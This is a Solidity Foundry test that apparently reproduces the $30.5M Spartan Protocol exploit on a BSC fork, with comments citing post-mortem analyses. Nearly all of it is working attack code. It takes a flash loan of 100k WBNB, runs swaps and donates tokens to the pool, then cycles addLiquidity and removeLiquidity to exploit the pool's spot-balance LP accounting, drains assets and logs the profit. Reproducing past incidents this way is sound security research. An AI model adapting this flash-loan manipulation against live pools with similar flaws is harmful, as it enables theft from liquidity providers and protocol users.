// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost: $30.5M
// Attacker: 0x3b6e77722e2bbe97c1cfa337b42c0939aeb83671
// Attack Contract: 0x288315639c1145f523af6d7a5e4ccf8238cd6a51
// Vulnerable Contract: 0x3de669c4f1f167a8afbc9993e4753b84b576426f
// Attack Tx: https://explorer.phalcon.xyz/tx/bsc/0xb64ae25b0d836c25d115a9368319902c972a0215bd108ae17b1b9617dfb93af8?line=0

// @Analyses
// https://medium.com/amber-group/exploiting-spartan-protocols-lp-share-calculation-flaws-391437855e74
// https://rekt.news/spartan-rekt/

contract Exploit is Test {
    IWBNB private constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 private constant SPARTA = IERC20(0xE4Ae305ebE1AbE663f261Bc00534067C80ad677C);

    IUniswapV2Pair private constant CAKE_WBNB = IUniswapV2Pair(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0);

    ISpartanPool private constant SPT1_WBNB = ISpartanPool(0x3de669c4F1f167a8aFBc9993E4753b84b576426f); // SPARTAN<>WBNB

    function setUp() public {
        vm.createSelectFork("https://binance.llamarpc.com", 7_048_832);
    }

    function testExploit() public {
        CAKE_WBNB.swap(0, 100_000 ether, address(this), "flashloan 100k WBNB");
    }

    function pancakeCall(address, uint256, uint256 amount1, bytes calldata) external {
        // 1: swap WBNB for SPARTA 5 times
        for (uint256 i; i < 4; ++i) {
            WBNB.transfer(address(SPT1_WBNB), 1913.17 ether);
            SPT1_WBNB.swapTo(address(SPARTA), address(this));
        }

        // 2: addLiquidity SPARTA<>WBNB, get LP tokens
        SPARTA.transfer(address(SPT1_WBNB), SPARTA.balanceOf(address(this))); // 2536613.206101067206978364
        WBNB.transfer(address(SPT1_WBNB), 11_853.33 ether);
        SPT1_WBNB.addLiquidity();

        // 3: swap WBNB for SPARTA 10 times (more in this step for less slippage)
        for (uint256 i; i < 9; ++i) {
            WBNB.transfer(address(SPT1_WBNB), 1674.02 ether);
            SPT1_WBNB.swapTo(address(SPARTA), address(this));
        }

        // 4: donate WBNB + SPARTAN to the pool
        SPARTA.transfer(address(SPT1_WBNB), SPARTA.balanceOf(address(this))); // 2639121.977427448690750716
        WBNB.transfer(address(SPT1_WBNB), 21_632.14 ether);

        // 5: removeLiquidity from step 2. Since the pool uses spot balanceOf() to calculate withdraw amounts, we can withdraw more assets than normal
        SPT1_WBNB.transfer(address(SPT1_WBNB), SPT1_WBNB.balanceOf(address(this))); // transfer LP tokens into the pool
        SPT1_WBNB.removeLiquidity(); // important: removeLiquidity() doesn't sync all spot balances into reserves

        // 6: immediately addLiquidity to "recover" donated tokens in step 4
        SPT1_WBNB.addLiquidity();

        // 7: removeLiquidity again to get all assets (with exploited profits) out
        IERC20(address(SPT1_WBNB)).transfer(address(SPT1_WBNB), IERC20(address(SPT1_WBNB)).balanceOf(address(this)));
        SPT1_WBNB.removeLiquidity();

        // 8: swap SPARTA back to WBNB
        uint256 swapAmount = SPARTA.balanceOf(address(this)) / 10;
        for (uint256 i; i < 9; ++i) {
            SPARTA.transfer(address(SPT1_WBNB), swapAmount);
            SPT1_WBNB.swapTo(address(WBNB), address(this));
        }

        // Repeat step 1 -> 8 to fully drain the pool. ~8 times in total

        // repay
        WBNB.transfer(address(CAKE_WBNB), amount1 * 1000 / 997);

        console.log("%s WBNB profit", WBNB.balanceOf(address(this)) / 1e18);
    }
}

/* ---------------------- Interface ---------------------- */
interface ISpartanPool {
    function swapTo(address token, address member) external payable returns (uint256 outputAmount, uint256 fee);
    function addLiquidity() external returns (uint256 liquidityUnits);
    function removeLiquidity() external returns (uint256 outputBase, uint256 outputToken);

    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IWBNB {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address guy, uint256 wad) external returns (bool);
    function withdraw(uint256 wad) external;
    function balanceOf(address) external view returns (uint256);
}

interface IUniswapV2Pair {
    function balanceOf(address) external view returns (uint256);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
}
